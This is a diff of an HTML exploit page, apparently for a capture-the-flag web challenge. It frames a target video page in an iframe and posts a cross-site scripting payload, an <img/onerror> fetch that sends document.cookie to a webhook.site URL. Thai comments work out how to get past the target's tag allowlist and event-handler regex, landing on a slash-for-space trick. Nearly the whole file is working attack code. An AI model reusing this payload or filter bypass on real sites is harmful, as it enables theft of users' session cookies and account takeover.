@@ -1,41 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>VlogStar Exploit</title>
-</head>
+<html>
+<head><meta charset="UTF-8"><title>x</title></head>
 <body>
 <script>
-  /*
-    Attack flow:
-    1. Bot visits this page (with flag cookie set on 34.87.93.26)
-    2. We open video.html in an iframe (same origin as the cookie)
-    3. Once iframe loads, we send a postMessage with overlay-update
-       containing a <script> that reads document.cookie and exfiltrates it
-    4. Cookie lands at our webhook / requestbin endpoint
-  */
+const EXFIL = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";
+const TARGET = "http://34.87.93.26:3000/video.html?v=featured";
 
-  // ---- CONFIGURE THIS ----
-  const EXFIL_URL = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";
-  // ------------------------
+const frame = document.createElement("iframe");
+frame.src = TARGET;
+frame.style.cssText = "width:800px;height:600px";
+document.body.appendChild(frame);
 
-  const TARGET = "http://34.87.93.26:3000/video.html?v=featured";
+frame.onload = function() {
+  setTimeout(function() {
+    // style attribute ไม่ถูก sanitize -> CSS injection via background-image
+    // แต่อ่าน cookie ไม่ได้จาก CSS...
+    // ใช้ SVG animateTransform หรือ foreignObject แทน
+    // foreignObject ไม่อยู่ใน allowlist แต่ svg ก็ไม่อยู่เช่นกัน
 
-  const frame = document.createElement("iframe");
-  frame.src = TARGET;
-  frame.style.display = "none";
-  document.body.appendChild(frame);
+    // -- วิธีที่ได้ผล: iframe src= ชี้ไปที่ page ที่เราควบคุม --
+    // แต่ video.html อยู่ same origin กับ cookie
+    // ดังนั้น inject <iframe src="javascript:..."> -- ถูกบล็อกโดย javascript:
+    
+    // ลอง: <iframe src="/api/..."> หรือ path ที่ reflect cookie?
+    // หรือใช้ <script> tag ที่ซ้อน encoding เพื่อ bypass regex
 
-  frame.onload = function () {
-    // Payload injected into #stream-overlay via postMessage
-    // Uses an <img onerror> trick to avoid </script> parsing issues
-    const payload = `<img src=x onerror="fetch('${EXFIL_URL}?c='+encodeURIComponent(document.cookie))">`;
+    // Bypass: ใช้ </script > (มี space) หรือ <scr\x00ipt> 
+    // sanitizer ใช้ regex: /<script\b ... <\/script>/gi และ /<\/script\s*>/gi
+    // แต่ก็ยัง catch ได้...
 
+    // วิธีที่น่าจะได้ผลที่สุด: <img> + style=content trick ไม่ได้
+    // ใช้ <svg/onload> -- svg ไม่ใน allowlist จะถูกลบ tag แต่ content ยังอยู่
+
+    // REAL bypass: tag ที่ไม่อยู่ใน allowlist จะ return "" (ลบแค่ tag ไม่ลบ content)
+    // ดังนั้น <svg><script>alert(1)</script></svg> 
+    // -> svg ถูกลบ, script ถูกลบทั้ง tag+content
+    // แต่: <svg><img src=x onerror=fetch(...)></svg>
+    // -> svg ถูกลบ tag, img อยู่ใน allowlist, onerror ถูกลบ
+
+    // KEY INSIGHT: on* regex: /\s+on[a-zA-Z]+\s*=\s*(?:'[^']*'|"[^"]*"|[^\s>]*)/gi
+    // ต้องมี whitespace นำหน้า! ลอง: <img/onerror=...> (ใช้ / แทน space)
+    
+    const payload = `<img/onerror="fetch('${EXFIL}?c='+encodeURIComponent(document.cookie))" src=x>`;
+    
     frame.contentWindow.postMessage(
       JSON.stringify({ type: "overlay-update", content: payload }),
       "http://34.87.93.26:3000"
     );
-  };
+  }, 2000);
+};
 </script>
 </body>
 </html>
